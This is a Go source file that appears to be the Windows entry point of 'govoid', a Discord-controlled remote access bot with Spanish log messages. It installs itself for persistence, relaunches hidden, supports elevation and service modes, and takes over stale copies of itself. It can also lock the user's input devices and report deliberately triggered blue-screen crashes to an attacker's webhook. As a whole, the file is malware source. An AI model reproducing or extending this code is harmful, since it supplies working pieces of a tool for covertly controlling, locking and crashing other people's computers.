//go:build windows

package main

import (
	"context"
	"errors"
	"log/slog"
	"os"
	"os/exec"
	"os/signal"
	"runtime/debug"
	"sync"
	"syscall"
	"time"

	"github.com/local/govoid/internal/bot"
	"github.com/local/govoid/internal/commands"
	"github.com/local/govoid/internal/config"
	"github.com/local/govoid/internal/util"
	"github.com/local/govoid/internal/win32"
)

var mutexName = config.MutexName

func main() {
	args := os.Args[1:]

	if config.BotToken == "" || config.GuildID == "" || config.WebhookURL == "" {
		slog.Error("compilación sin credenciales: falta token, guild o webhook")
		return
	}

	elevatedStart := false

	if len(args) > 0 {
		switch args[0] {
		case "--noop":
			return
		case "--service":
			if err := win32.RunService(); err != nil {
				os.Exit(1)
			}
			return
		case "--lockguard":
			if slot := win32.GuardSlot(args[1:]); slot >= 0 {
				win32.RunGuard(slot)
			}
			return
		case "--elevated":
			elevatedStart = true
			if err := win32.WriteElevationMarker(); err != nil {
				slog.Debug("elevación: marcador", "err", err)
			}
		case "--sessionwatch":
			runSessionWatch()
			return
		case "--sessionprobe":
			runSessionProbe()
			return
		case "--identity":
			if len(args) > 1 {
				if err := os.WriteFile(args[1], []byte(commands.IdentityReport()), 0o644); err != nil {
					os.Exit(1)
				}
			}
			return
		}
	}

	setupLogging()

	win32.SetBSODTrace(func(line string) { slog.Info("bsod traza", "paso", line) })

	mutexWait := 6 * time.Second
	if elevatedStart {
		mutexWait = 25 * time.Second
	}
	if err := win32.AcquireSingleInstance(mutexName, mutexWait); err != nil {
		if !errors.Is(err, win32.ErrAlreadyRunning) {
			slog.Debug("mutex de instancia única", "err", err)
		} else if win32.HeartbeatFresh(4 * time.Minute) {
			slog.Info("instancia: agente sano en marcha, esta copia sale")
			return
		} else {
			killed := win32.TakeOverStaleAgent()
			slog.Warn("instancia: agente sin latido, tomando el relevo", "terminados", killed)
			time.Sleep(2 * time.Second)
			if retryErr := win32.AcquireSingleInstance(mutexName, 15*time.Second); retryErr != nil {
				slog.Info("instancia: no se pudo tomar el relevo", "err", retryErr)
				return
			}
		}
	}

	commands.StartGlobal()

	if hbErr := win32.WriteHeartbeat(); hbErr != nil {
		slog.Debug("latido: no se pudo escribir al arrancar", "err", hbErr)
	}

	if err := autoInstall(); err != nil {
		slog.Debug("auto-install", "err", err)
	}

	if win32.LockRequested() {
		if err := win32.EnforceLock(commands.ShieldBinary()); err != nil {
			slog.Debug("candado", "err", err)
		}
	} else {
		win32.RestoreInputDevices()
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()
	commands.CancelRoot = cancel

	if os.Getenv("GOVOID_DIAG") != "" {
		go func() {
			time.Sleep(2 * time.Second)
			_ = util.PostWebhook("🩺 Preflight BSOD", 3447003, []util.EmbedField{
				{Name: "diagnostico", Value: "```\n" + win32.BSODDiagnostics() + "\n```"},
			})
		}()
	}

	if method, pending := win32.PendingBugcheck(); pending {
		slog.Info("bugcheck: aviso pendiente encontrado", "metodo", method)
		go reportPendingBugcheck(method)
	} else {
		slog.Debug("bugcheck: sin aviso pendiente")
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, syscall.SIGTERM)
	go func() {
		select {
		case <-signals:
			cancel()
		case <-ctx.Done():
		}
	}()

	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if recovered := recover(); recovered != nil {
				slog.Error("panic en el bot", "panic", recovered, "stack", string(debug.Stack()))
			}
		}()
		bot.RunWithReconnect(ctx, func() error {
			return bot.Start(ctx)
		})
	}()

	<-ctx.Done()
	wg.Wait()
	commands.StopGlobal()
	time.Sleep(2 * time.Second)
}

func autoInstall() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}
	target := commands.InstallPath()

	if commands.IsInstalledPath(exe) {
		return commands.InstallAll()
	}

	if err := commands.InstallAll(); err != nil {
		slog.Debug("auto-install: persistencia parcial", "err", err)
	}

	if _, err := os.Stat(target); err != nil {
		return err
	}

	cmd := exec.Command(target)
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
	if err := cmd.Start(); err != nil {
		return err
	}

	os.Exit(0)
	return nil
}

func reportPendingBugcheck(method string) {
	waitCtx, cancel := context.WithTimeout(context.Background(), 3*time.Minute)
	defer cancel()
	util.WaitUntilOnline(waitCtx)

	code, when, err := win32.LastBugcheckCode()

	fields := []util.EmbedField{
		{Name: "metodo", Value: "```\n" + method + "\n```"},
	}
	if err != nil {
		fields = append(fields, util.EmbedField{
			Name:  "codigo",
			Value: "```\nsin evento: " + err.Error() + "\n```",
		})
	} else {
		fields = append(fields, util.EmbedField{
			Name:  "codigo",
			Value: "```\n" + code + "\n" + when.Format(time.RFC3339) + "\n```",
		})
	}

	if postErr := util.PostWebhook("💀 Bugcheck confirmado", 3066993, fields); postErr != nil {
		slog.Warn("bugcheck: aviso pendiente, no se pudo publicar", "err", postErr)
		return
	}
	slog.Info("bugcheck: confirmado y publicado", "codigo", code)
	_ = win32.ClearPendingBugcheck()
}
